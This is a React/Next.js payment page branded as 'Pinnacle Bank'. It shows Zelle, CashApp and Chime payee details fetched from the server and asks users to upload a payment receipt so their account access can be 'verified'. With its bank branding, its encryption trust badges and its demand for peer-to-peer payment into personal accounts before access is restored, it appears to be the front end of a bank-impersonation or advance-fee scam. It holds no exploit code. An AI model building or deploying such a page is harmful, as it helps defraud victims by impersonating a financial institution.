"use client";

import { useState, useEffect } from "react";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";
import {
  Lock,
  Shield,
  CheckCircle2,
  Upload,
  FileImage,
  Banknote,
  Smartphone,
  Mail,
} from "lucide-react";
import { getPaymentInfo, sendPaymentReceipt } from "@/actions";

interface PaymentPageProps {
  userName: string;
  userEmail: string;
}

export default function PaymentPage({ userName, userEmail }: PaymentPageProps) {
  const [paymentInfo, setPaymentInfo] = useState<any>(null);
  const [selectedMethod, setSelectedMethod] = useState<
    "Zelle" | "CashApp" | "Chime"
  >("Zelle");
  const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Fetch payment info
  useEffect(() => {
    let mounted = true;
    (async () => {
      const data = await getPaymentInfo();
      if (mounted) setPaymentInfo(data);
    })();
    return () => {
      mounted = false;
    };
  }, []);

  const handleReceiptUpload = async (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.type.startsWith("image/")) {
      toast.error("Please upload a valid image file (JPEG, PNG, etc.)");
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      toast.error("File size must not exceed 5MB");
      return;
    }

    setUploading(true);
    const formData = new FormData();
    formData.append("file", file);
    formData.append(
      "upload_preset",
      process.env.NEXT_PUBLIC_CLOUDINARY_PRESET!
    );

    try {
      const res = await fetch(
        `https://api.cloudinary.com/v1_1/${process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME}/upload`,
        { method: "POST", body: formData }
      );
      const data = await res.json();
      if (data.secure_url) {
        setReceiptUrl(data.secure_url);
        toast.success("Receipt uploaded securely");
      } else {
        throw new Error("Upload failed");
      }
    } catch (err) {
      console.error(err);
      toast.error("Failed to upload receipt. Please try again.");
    } finally {
      setUploading(false);
    }
  };

  const handleSubmit = async () => {
    if (!receiptUrl) {
      toast.error("Please upload your payment receipt first");
      return;
    }

    setIsSubmitting(true);
    const result = await sendPaymentReceipt({
      userName,
      userEmail,
      paymentMethod: selectedMethod,
      cloudinaryUrl: receiptUrl,
    });

    if (result.success) {
      toast.success(
        "Payment receipt submitted successfully. Your account is under review."
      );
      setReceiptUrl(null);
    } else {
      toast.error(
        result.message || "Submission failed. Please contact support."
      );
    }
    setIsSubmitting(false);
  };

  if (!paymentInfo) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="text-center">
          <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#1A5DAD] mx-auto"></div>
          <p className="mt-4 text-sm text-gray-600">
            Loading secure payment portal...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto">
        {/* Header - Pinnacle Bank Branding */}
        <div className="text-center mb-10">
          <div className="flex justify-center items-center gap-3 mb-4">
            <div className="bg-[#1A5DAD] text-white p-2 rounded-lg">
              <Banknote className="h-8 w-8" />
            </div>
            <h1 className="text-3xl font-bold text-gray-900">Pinnacle Bank</h1>
          </div>
          <p className="text-lg text-gray-600">
            Secure Payment Verification Portal
          </p>
          <div className="flex justify-center items-center gap-2 mt-3">
            <Lock className="h-4 w-4 text-green-600" />
            <span className="text-sm text-green-600 font-medium">
              256-bit SSL Encrypted
            </span>
          </div>
        </div>

        {/* Security Alert */}

        {/* Payment Method Selection */}
        <Card className="shadow-lg border-0">
          <CardHeader className="bg-gradient-to-r from-[#1A5DAD] to-[#0D47A1] text-white rounded-t-lg">
            <CardTitle className="flex items-center gap-2 text-xl">
              <Smartphone className="h-5 w-5" />
              Select Payment Method
            </CardTitle>
          </CardHeader>
          <CardContent className="p-6 space-y-6">
            {[
              {
                method: "Zelle" as const,
                icon: Mail,
                details: [
                  { label: "Email", value: paymentInfo.zelleEmail },
                  { label: "Phone", value: paymentInfo.zellePhone },
                ],
              },
              {
                method: "CashApp" as const,
                icon: Banknote,
                details: [
                  { label: "Cashtag", value: paymentInfo.cashAppUsername },
                  { label: "Email", value: paymentInfo.cashAppEmail },
                ],
              },
              {
                method: "Chime" as const,
                icon: Smartphone,
                details: [
                  {
                    label: "Account Name",
                    value: paymentInfo.chimeAccountName,
                  },
                  {
                    label: "Account Number",
                    value: paymentInfo.chimeAccountNumber,
                  },
                  {
                    label: "Routing Number",
                    value: paymentInfo.chimeRoutingNumber,
                  },
                ],
              },
            ].map(({ method, icon: Icon, details }) => (
              <div
                key={method}
                className={`p-5 rounded-lg border-2 transition-all cursor-pointer
                  ${
                    selectedMethod === method
                      ? "border-[#1A5DAD] bg-blue-50 shadow-md"
                      : "border-gray-200 hover:border-gray-300"
                  }`}
                onClick={() => setSelectedMethod(method)}
              >
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div
                      className={`p-2 rounded-full ${
                        selectedMethod === method
                          ? "bg-[#1A5DAD] text-white"
                          : "bg-gray-200 text-gray-600"
                      }`}
                    >
                      <Icon className="h-5 w-5" />
                    </div>
                    <div>
                      <h3 className="font-semibold text-lg text-gray-900 flex items-center gap-2">
                        {method}
                        {selectedMethod === method && (
                          <div className="bg-green-100 text-green-800 text-xs">
                            Selected
                          </div>
                        )}
                      </h3>
                      <div className="mt-2 space-y-1">
                        {details.map(({ label, value }) =>
                          value ? (
                            <p key={label} className="text-sm text-gray-700">
                              <span className="font-medium">{label}:</span>{" "}
                              {value}
                            </p>
                          ) : null
                        )}
                      </div>
                    </div>
                  </div>
                  {selectedMethod === method && (
                    <CheckCircle2 className="h-6 w-6 text-[#1A5DAD]" />
                  )}
                </div>
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Receipt Upload */}
        <Card className="mt-8 shadow-lg border-0">
          <CardHeader className="bg-gradient-to-r from-[#1A5DAD] to-[#0D47A1] text-white rounded-t-lg">
            <CardTitle className="flex items-center gap-2 text-xl">
              <FileImage className="h-5 w-5" />
              Upload Payment Receipt
            </CardTitle>
          </CardHeader>
          <CardContent className="p-6 space-y-6">
            <div>
              <Label
                htmlFor="receipt-upload"
                className="text-base font-semibold flex items-center gap-2"
              >
                <Upload className="h-4 w-4" />
                Receipt Image (Max 5MB)
              </Label>
              <p className="text-sm text-gray-600 mt-1">
                Please upload a clear screenshot or photo of your payment
                confirmation.
              </p>
              <input
                id="receipt-upload"
                type="file"
                accept="image/*"
                onChange={handleReceiptUpload}
                disabled={uploading}
                className="mt-3 block w-full text-sm text-gray-700 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-[#1A5DAD] file:text-white hover:file:bg-[#0D47A1] disabled:opacity-50"
              />
            </div>

            <Button
              onClick={handleSubmit}
              disabled={!receiptUrl || uploading || isSubmitting}
              className="w-full bg-[#1A5DAD] hover:bg-[#0D47A1] text-white font-semibold py-6 text-lg transition-all"
            >
              {isSubmitting ? "Submitting..." : "Submit for Verification"}
            </Button>

            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 text-sm text-amber-800">
              <p className="font-semibold flex items-center gap-2">
                <Shield className="h-4 w-4" />
                Verification Process
              </p>
              <ul className="mt-2 space-y-1 list-disc list-inside">
                <li>Our team reviews receipts within 1–2 business hours</li>
                <li>
                  You’ll receive an email confirmation at{" "}
                  <strong>{userEmail}</strong>
                </li>
                <li>Account access enabled upon successful verification</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        {/* Footer Trust Bar */}
        <div className="mt-12 text-center text-xs text-gray-500 space-y-1">
          <p>© 2025 Pinnacle Bank. All rights reserved.</p>
          <p className="flex items-center justify-center gap-1">
            <Lock className="h-3 w-3" /> Secured by industry-leading encryption
          </p>
        </div>
      </div>
    </div>
  );
}
